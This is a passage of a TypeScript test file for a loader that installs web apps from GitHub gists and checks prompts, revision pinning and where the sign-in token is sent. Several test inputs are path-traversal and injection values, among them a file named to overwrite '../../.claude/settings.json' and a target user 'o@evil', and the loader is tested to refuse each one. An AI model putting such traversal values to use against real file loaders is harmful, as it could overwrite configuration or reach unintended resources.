    // without a page and without a kind's keys it is not an app
    await expect(fetchGistApp({ user: '', id: ID }, gistSite({ 'app.json': '{"name": "Nothing"}' }).fetchFn)).rejects.toThrow(/entry is missing/);
  });

  it('a file too large for the answer is fetched by itself, at the same revision', async () => {
    const raw = `https://gist.githubusercontent.com/octocat/${ID}/raw/${REV}/big%20data.js`;
    const { fetchFn, calls } = gistSite({ 'app.json': '{"name": "Big"}', 'index.html': '<p>', 'big data.js': { truncated: true } }, { [raw]: 'the whole file' });
    const files = await (await fetchGistApp({ user: '', id: ID }, fetchFn)).files();
    expect(new TextDecoder().decode(files.get('big data.js'))).toBe('the whole file');
    expect(calls.map((c) => c.url)).toEqual([`https://api.github.com/gists/${ID}`, raw]);
  });

  const gistCases: [string, Parameters<typeof gistSite>, { user: string; id: string }, RegExp][] = [
    ['a gist that does not exist', [{}, { [`https://api.github.com/gists/${ID}`]: () => new Response('{}', { status: 404 }) }], { user: '', id: ID }, /gist\.github\.com\/abcdef\S+ does not exist/],
    ['a gist of another account than the link names', [{ 'app.json': ONE }], { user: 'someone-else', id: ID }, /is not a gist of that account/],
    ['a gist without app.json', [{ 'index.html': '<p>' }], { user: '', id: ID }, /has no app\.json: it is not an app/],
    ['a revision that is not one', [{ 'app.json': ONE }, {}, { history: [{ version: '../../main' }] }], { user: '', id: ID }, /could not read the revision/],
    ['a gist without a history', [{ 'app.json': ONE }, {}, { history: [] }], { user: '', id: ID }, /could not read the revision/],
    ['a file whose name is a path', [{ 'app.json': ONE, '../../.claude/settings.json': 'x' }], { user: '', id: ID }, /not a plain name/],
    ['a file in a folder', [{ 'app.json': ONE, 'public/index.html': 'x' }], { user: '', id: ID }, /not a plain name/],
    ['a list of files cut short', [{ 'app.json': ONE }, {}, { truncated: true }], { user: '', id: ID }, /too many files/],
    ['an answer that is not JSON', [{}, { [`https://api.github.com/gists/${ID}`]: '<html>' }], { user: '', id: ID }, /could not read gist\.github\.com/],
    ['a manifest that is not valid', [{ 'app.json': '{"name": "Tidy", "run": "jq ."}' }], { user: '', id: ID }, /manifest is not valid:\napp\.json: run must say where the file goes: \{in\}/],
    ['GitHub\'s limit for visitors', [{}, { [`https://api.github.com/gists/${ID}`]: () => new Response('{}', { status: 403, headers: { 'x-ratelimit-remaining': '0' } }) }], { user: '', id: ID }, /rate limit for visitors/],
  ];
  for (const [what, args, target, why] of gistCases) {
    it(`refuses ${what}`, async () => {
      await expect((async () => (await fetchGistApp(target, gistSite(...args).fetchFn)).files())()).rejects.toThrow(why);
    });
  }

  it('a target the parser did not make is refused before any fetch', async () => {
    const { fetchFn, calls } = gistSite({ 'app.json': ONE });
    for (const t of [{ user: '', id: '../x' }, { user: '../..', id: ID }, { user: 'o@evil', id: ID }, { user: '', id: `${ID}/../../repos/o/r` }]) await expect(fetchGistApp(t, fetchFn)).rejects.toThrow(/no such app/);
    expect(calls).toEqual([]);
  });

  it('the link asks first; the same revision opens without asking; a new revision asks again', async () => {
    const { fetchFn } = gistSite({ 'app.json': ONE });
    const h = harness(`?app=gist:${ID}`, fetchFn, 'install');
    expect(await handleAppLink(h.deps)).toBe('installed');
    expect(h.log.prompts).toHaveLength(1);
    expect(h.log.prompts[0].manifestText).toBe(ONE);
    expect(new TextDecoder().decode(h.log.installs[0].files.get('app.json'))).toBe(ONE);
    expect(h.log.opens).toEqual([['tidy-json', false]]);
    expect(await handleAppLink(h.deps)).toBe('opened');
    expect(h.log.prompts).toHaveLength(1);
    const moved = gistSite({ 'app.json': ONE.replace('jq . {in}', 'jq -c . {in}') }, {}, { history: [{ version: 'c'.repeat(40) }] });
    expect(await handleAppLink({ ...h.deps, fetch: moved.fetchFn })).toBe('installed');
    expect(h.log.prompts).toHaveLength(2);
    expect(h.log.prompts[1].manifest.run).toBe('jq -c . {in}');
    // Cancel installs nothing; the sign-in sheet's fetch is used when one is given
    const c = harness(`?app=gist:${ID}`, fetchFn, 'cancel');
    expect(await handleAppLink(c.deps)).toBe('cancelled');
    expect(c.log.installs).toEqual([]);
    const asked: string[] = [];
    const g = harness(`?app=gist:${ID}`, fetchFn, 'install', { github: async (action, run) => { asked.push(action); return run('tok'); } });
    expect(await handleAppLink(g.deps)).toBe('installed');
    expect(asked).toEqual([`gist:${ID}`]);
  });

  it('signed in, the token goes to GitHub\'s API only', async () => {
    const raw = `https://gist.githubusercontent.com/octocat/${ID}/raw/${REV}/big.js`;
    const { fetchFn, calls } = gistSite({ 'app.json': '{"name": "Big"}', 'index.html': '<p>', 'big.js': { truncated: true } }, { [raw]: 'x' });
    await (await fetchGistApp({ user: '', id: ID }, fetchFn, 'secret-token')).files();
    expect((calls[0].init?.headers as Record<string, string>).authorization).toBe('Bearer secret-token');
    expect(JSON.stringify(calls[1].init ?? {})).not.toContain('secret-token');
  });
});

describe('the examples (apps/examples)', () => {
  it('are installable by id, as examples/<id> too, and have no dock entry', async () => {
    const apps = siteApps(ROOT) as { id: string; files: { path: string }[] }[];
    for (const id of ['searchable-pdf', 'jq-playground', 'expenses']) {
      expect(apps.find((a) => a.id === id)?.files.map((f) => f.path), id).toEqual(['app.json']);
      expect(parseAppSpec(`examples/${id}`)).toEqual({ kind: 'site', id });
    }
    const out = mkdtempSync(join(tmpdir(), 'tc-apps-'));
    writeSiteApps(out, ROOT);
    const fetchFn = async (url: string) => {
      const file = join(out, new URL(url).pathname);
      if (!existsSync(file)) return new Response('Not found', { status: 404, headers: { 'content-type': 'text/plain' } });
      return new Response(readFileSync(file), { status: 200, headers: { 'content-type': file.endsWith('.json') ? 'application/json' : 'application/octet-stream' } });
    };
    const app = await fetchSiteApp('expenses', ORIGIN, fetchFn);
    // the one file has no id: the site's entry (its folder's name) gives it
    expect(app).toMatchObject({ curated: true, manifest: { id: 'expenses', kind: 'table', table: 'expenses.csv' } });
    expect([...(await app.files()).keys()]).toEqual(['app.json']);
    const { shippedApps } = await import('@shiro/apps/shipped');
    expect(shippedApps().some((a) => ['searchable-pdf', 'jq-playground', 'expenses', 'examples'].includes(a.id))).toBe(false);
  });
});
